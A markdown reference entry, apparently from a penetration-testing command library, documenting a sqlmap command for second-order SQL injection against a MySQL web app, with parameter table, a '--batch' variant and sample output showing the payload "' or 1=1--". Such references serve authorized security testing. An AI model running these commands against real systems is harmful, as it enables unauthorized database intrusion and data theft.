---
type: command
executor: bash
data: >-
  python sqlmap.py -r /tmp/r.txt --dbms=MySQL --second-order
  "http://targetapp/wishlist" -v 3
tags:
  - sql-injection
  - sqlmap
  - second-order
platforms:
  - Linux
verified: true
validated: true
---

# sqlmap-second-order-injection-with-request-file

## Command

```bash
python sqlmap.py -r /tmp/r.txt --dbms=MySQL --second-order "http://targetapp/wishlist" -v 3
```

## Description

This command uses SQLmap to test for second-order SQL injection vulnerabilities by loading an HTTP request from a file and targeting a MySQL backend. It is used when initial access to an injectable endpoint is available via a captured request, focusing on delayed execution payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -r /tmp/r.txt | Path to the HTTP request file captured from a proxy | Yes |
| --dbms=MySQL | Specifies the target database management system | Yes |
| --second-order "http://targetapp/wishlist" | Defines the URL where the second-order payload executes after storage | Yes |
| -v 3 | Sets verbosity level to 3 for detailed injection logs | No |

## Examples

### Basic Usage

```bash
python sqlmap.py -r /tmp/r.txt --dbms=MySQL --second-order "http://targetapp/wishlist" -v 3
```

### Advanced Usage

```bash
python sqlmap.py -r /tmp/r.txt --dbms=MySQL --second-order "http://targetapp/wishlist" -v 3 --batch
```

## Expected Output

The command will output injection attempts, such as:

[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
second-order injection confirmed
payload: ' or 1=1--

If vulnerable, it proceeds to enumerate basic info; otherwise, it reports no vulnerability.

## Related

- [[procedures/Enumerate-MySQL-Databases-via-Second-Order-SQL-Injection-with-SQLmap]]
- [[tools/sqlmap]]
